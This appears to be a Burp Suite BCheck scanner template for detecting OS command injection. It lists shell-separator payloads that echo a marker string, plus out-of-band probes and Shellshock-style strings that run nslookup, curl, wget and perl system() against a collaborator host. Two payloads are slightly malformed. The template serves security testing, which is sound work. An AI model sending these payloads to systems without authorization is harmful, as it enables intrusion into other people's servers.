metadata:
    language: v2-beta
    name: "OS Command Injection on Parameter"
    description: "OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data"
    author: "j3ssie"
    tags: "rce", "command-injection", "injection", "os-command-injection", "oast", "out-of-band"

define:
    issueDetail = `OS command injection on via Parameter {latest.request.url}`
    references = `
    ## References:
    - https://github.com/ewilded/shelling
    - https://portswigger.net/web-security/os-command-injection
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
    - https://github.com/projectdiscovery/fuzzing-templates/tree/main/cmdi
    - https://bishopfox.com/blog/ruby-vulnerabilities-exploits
    - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html`
    issueRemediation = `Never call out to OS commands from application-layer code
     {references}`
    # matchString = {random_str(20)} # somehow this cause an error
    # md5('bcheck-ci-test')
    matchString = "5d479e540dab9cb284f120082d20b37c"

run for each:
    injections =
        `echo%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `%20echo%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `;echo%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `&echo%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `|echo%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `||echo%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `&&echo%205d479e540dab9cb284f120082d20b37c$((69%2B52)$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `%0aecho%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `%3Becho%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `%26echo%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `%26%26echo%205d479e540dab9cb284f120082d20b37c$((69%2B52)$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `%7Cecho%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `%7C%7Cecho%205d479e540dab9cb284f120082d20b37c$((69%2B52))$(echo%205d479e540dab9cb284f120082d20b37c)5d479e540dab9cb284f120082d20b37c`,
        `&nslookup {generate_collaborator_address()}&'\\\"\`0&nslookup {generate_collaborator_address()}&\`'`,
        `|nslookup {generate_collaborator_address()}|curl {generate_collaborator_address()}`,
        `1;nslookup$\{IFS\}{generate_collaborator_address()};#$\{IFS\}';nslookup$\{IFS\}{generate_collaborator_address()};#$\{IFS\}\";nslookup$\{IFS\}{generate_collaborator_address()};#$\{IFS\}`,
        `/*$(nslookup {generate_collaborator_address()})\`nslookup {generate_collaborator_address()}\`\`*/-nslookup({generate_collaborator_address()})-'/*$(nslookup {generate_collaborator_address()})\`nslookup {generate_collaborator_address()}\` #*/-nslookup({generate_collaborator_address()})||'\"||nslookup({generate_collaborator_address()})||\"/*\`*/`,
        `$(ping -c 1 {generate_collaborator_address()} | nslookup {generate_collaborator_address()} ; wget {generate_collaborator_address()} -O /dev/null)`,
        `() \{ :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://{generate_collaborator_address()}?vuln=13;curl http://{generate_collaborator_address()}?vuln=15;\");'`,
        `() \{ :;}; wget http://{generate_collaborator_address()}?vuln=11`,
        `| wget http://{generate_collaborator_address()}/.testing/rce.txt`,
        `& wget http://{generate_collaborator_address()}/.testing/rce.txt`,
        `; wget https://{generate_collaborator_address()}/.testing/rce_vuln.txt`,
        `$(\`wget https://{generate_collaborator_address()}/.testing/rce_vuln.txt\`)`,
        `&& wget https://{generate_collaborator_address()}/.testing/rce_vuln.txt`,
        `wget https://{generate_collaborator_address()}/.testing/rce_vuln.txt`,
        `$(\`wget https://{generate_collaborator_address()}/.testing/rce_vuln.txt?req=22jjffjbn\`)`

given insertion point then
    send payload called check1:
        replacing: {injections}

    send payload called check2:
        appending: {injections}

    if (`{matchString}` in {check1.response.body}) or
        (`{matchString}` in {check2.response.body}) then
        if not(`{matchString}` in {base.response.body}) then
            report issue:
                severity: high
                confidence: tentative
                detail: `{issueDetail}`
                remediation: `{issueRemediation}`
        end if
    end if

    if http interactions then
        report issue:
            severity: high
            confidence: tentative
            detail: `{issueDetail}`
            remediation: `{issueRemediation}`
    end if

    if dns interactions then
        report issue:
            severity: medium
            confidence: tentative
            detail: `{issueDetail}`
            remediation: `{issueRemediation}`
    end if
